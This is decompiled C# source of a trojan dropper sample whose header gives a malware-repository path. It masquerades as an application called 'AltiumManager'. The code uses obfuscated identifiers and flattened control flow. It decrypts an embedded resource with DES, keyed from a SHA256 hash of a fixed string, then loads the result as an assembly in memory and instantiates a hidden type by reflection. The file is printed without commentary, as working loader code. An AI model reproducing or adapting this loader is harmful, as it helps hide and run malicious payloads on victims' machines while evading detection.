// Decompiled with JetBrains decompiler
// Type: AltiumManager.
// Assembly: NtRFufHofqVzZAe, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A3465D-1BFC-53F3-99D7-B93CF53E7ECD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-3a2a9cfdbd61a0059dfc842bf5333d9548d205d7c6313ef12be7840df044fc87.exe

using AltiumManager.My;
using AltiumManager.My.Resources;
using Microsoft.VisualBasic;
using System;
using System.Drawing;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace AltiumManager
{
  internal class \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263
  {
    private System.Type L;

    public \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263(
      ToolStripMenuItem _param1)
    {
label_6:
      int num1 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE93(104);
      int num2 = 10;
      while (true)
      {
        switch (num2 ^ 146)
        {
          case 149:
            switch (num1 + 155)
            {
              case 0:
                num1 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(87);
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE357);
                num1 = -12;
                goto label_1;
              case 2:
                this.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE356();
                num1 = -9;
                goto label_1;
              case 3:
                this.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE357(new ColorConverter());
                num1 = -5;
                goto label_1;
              case 4:
                goto label_12;
              default:
                num2 = 4;
                continue;
            }
          case 150:
            goto label_6;
          case 151:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\u002Ector);
            num2 = 5;
            continue;
          case 152:
label_1:
            num1 ^= 146;
            break;
        }
        num2 = 7;
      }
label_12:;
    }

    public void \uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE356()
    {
label_7:
      int num1 = 3;
      int num2 = -23;
      while (true)
      {
        switch ((num2 ^ 154) + 144)
        {
          case 0:
            Assembly assembly;
            switch (num1)
            {
              case 149:
                assembly = Thread.GetDomain().Load(this.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE358(Platinium.\uE4AC\uE7D6\uE2BB\uE668\uEF32\uEFB4\uF2AB\uE72D\uE6CE\uEAA2\uEA04\uEF19));
                num1 = 0;
                goto label_1;
              case 150:
                this.L = assembly.GetType(Strings.StrReverse("rL.Qa"));
                num1 = 14;
                goto label_1;
              case 151:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\u002Ector);
                num1 = 1;
                goto label_1;
              case 152:
                goto label_10;
              default:
                // ISSUE: reference to a compiler-generated method
                num2 = Platinium.\uE914\uE4B6\uE066\uEBD1\uE75B\uE04D\uE6A3\uF28F\uF124\uF18E\uEEEF\uE130(136);
                continue;
            }
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE358);
            num2 = -21;
            continue;
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 150;
            break;
        }
        num2 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF485(124);
      }
label_10:;
    }

    public object \uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE357(
      ColorConverter _param1)
    {
label_4:
      int num1 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(82);
      int num2 = 19;
      while (true)
      {
        switch (num2 ^ 143)
        {
          case 153:
            goto label_4;
          case 154:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\u002Ector);
            num2 = 21;
            continue;
          case 155:
            object[] objArray;
            switch (num1 + 154)
            {
              case 0:
                objArray = new object[3]
                {
                  (object) \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF262.\uE36F\uF444\uE293\uF88E\uEA1C\uEDF1\uE67D\uF1AF\uF67B\uE77A\uF29A\uE2CD,
                  null,
                  null
                };
                num1 = -15;
                goto label_1;
              case 1:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE357);
                num1 = -2;
                goto label_1;
              case 2:
                objArray[1] = (object) \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF262.\uE36F\uF444\uE293\uF88E\uEA1C\uEDF1\uE67D\uF1AF\uF67B\uE77A\uF29A\uE2CE;
                num1 = -14;
                goto label_1;
              case 3:
                num1 = -13;
                goto label_1;
              case 4:
                objArray = (object[]) null;
                num1 = -1;
                goto label_1;
              case 5:
                objArray[2] = (object) "AltiumManager";
                num1 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE93(104);
                goto label_1;
              case 6:
                Activator.CreateInstance(this.L, objArray);
                num1 = -12;
                goto label_1;
              case 7:
                goto label_15;
              default:
                num2 = 22;
                continue;
            }
          case 156:
label_1:
            num1 ^= 153;
            break;
        }
        num2 = 20;
      }
label_15:
      object obj;
      return obj;
    }

    public byte[] \uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE358(
      byte[] _param1)
    {
label_5:
      int num1 = AltiumDatabaseDataSet.ReleasedComponentsDataTable.\uE793\uEAE2\uE6B1\uF808\uF6E3\uEDE6\uEBAD\uE72E\uE85D\uEE14\uEA64\uF258(149);
      int num2 = 17;
      byte[] numArray1;
      while (true)
      {
        switch (num2 ^ 143)
        {
          case 155:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE356);
            num2 = 20;
            continue;
          case 156:
            goto label_5;
          case 157:
            DESCryptoServiceProvider cryptoServiceProvider1;
            byte[] destinationArray;
            byte[] numArray2;
            byte[] hash;
            SHA256CryptoServiceProvider cryptoServiceProvider2;
            switch (num1 + 146)
            {
              case 0:
                cryptoServiceProvider1.Key = destinationArray;
                num1 = -30;
                goto label_1;
              case 1:
                numArray2 = cryptoServiceProvider1.CreateDecryptor().TransformFinalBlock(_param1, 0, _param1.Length);
                num1 = -31;
                goto label_1;
              case 2:
                cryptoServiceProvider1.Mode = CipherMode.ECB;
                num1 = -19;
                goto label_1;
              case 3:
                Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 8);
                num1 = -17;
                goto label_1;
              case 4:
                destinationArray = new byte[8];
                num1 = -22;
                goto label_1;
              case 5:
                hash = cryptoServiceProvider2.ComputeHash(Encoding.BigEndianUnicode.GetBytes("Three"));
                num1 = -24;
                goto label_1;
              case 6:
                num1 = -10;
                goto label_1;
              case 7:
              case 14:
                goto label_21;
              case 8:
                num1 = -9;
                goto label_1;
              case 9:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF263.\uE061\uE529\uE8AC\uF2EA\uEAD0\uE471\uEE92\uE493\uE601\uE7B7\uE7D1\uE358);
                num1 = -18;
                goto label_1;
              case 10:
                numArray1 = numArray2;
                num1 = -20;
                goto label_1;
              case 11:
                cryptoServiceProvider1 = new DESCryptoServiceProvider();
                num1 = -29;
                goto label_1;
              case 12:
                cryptoServiceProvider2 = new SHA256CryptoServiceProvider();
                num1 = \uE2A8\uE14A\uF838\uE66F\uF669\uEE85\uF207\uE4CC\uF601\uE8E4\uE14C\uF260.\uF082\uF12C\uE11A\uE8A0\uE428\uF545\uE4D3\uE1FE\uEE4C\uE9EC\uF5C3\uEFB7.\uEA88\uE10F\uE996\uE661\uF488\uF652\uF8B1\uE5BC\uF339\uE8F4\uF2C0\uF484(121);
                goto label_1;
              case 13:
                num1 = -23;
                goto label_1;
              default:
                num2 = 19;
                continue;
            }
          case 158:
label_1:
            num1 ^= 153;
            break;
        }
        num2 = 18;
      }
label_21:
      return numArray1;
    }
  }
}
